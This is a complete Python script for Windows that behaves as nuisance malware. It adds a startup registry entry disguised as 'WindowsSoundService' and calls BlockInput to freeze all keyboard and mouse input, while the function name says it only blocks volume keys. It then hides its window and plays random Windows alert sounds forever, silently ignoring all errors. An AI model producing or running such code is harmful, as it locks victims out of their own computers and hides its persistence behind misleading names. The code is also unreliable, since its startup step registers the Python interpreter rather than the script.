import os, time, random, pygame, sys, ctypes
from threading import Thread
import winreg as reg

pygame.mixer.init()

sound_files = [
    "Windows Ding.wav",
    "Windows Error.wav",
    "Windows Hardware Insert.wav",
    "Windows Notify Email.wav",
    "Windows User Account Control.wav"
]


def add_to_startup():
    try:
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(key, key_path, 0, reg.KEY_WRITE) as registry_key:
            reg.SetValueEx(registry_key, "WindowsSoundService", 0, reg.REG_SZ, sys.executable)
    except:
        pass


def block_volume_keys():
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

add_to_startup()
block_volume_keys()

def play_random_sound():
    while True:
        time.sleep(random.randint(1, 10))
        sound = random.choice(sound_files)
        try:
            pygame.mixer.music.load(sound)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy():
                time.sleep(0.1)
        except:
            pass

try:
    import win32gui, win32con
    win = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(win, win32con.SW_HIDE)
except:
    pass

sound_thread = Thread(target=play_random_sound, daemon=True)
sound_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    sys.exit()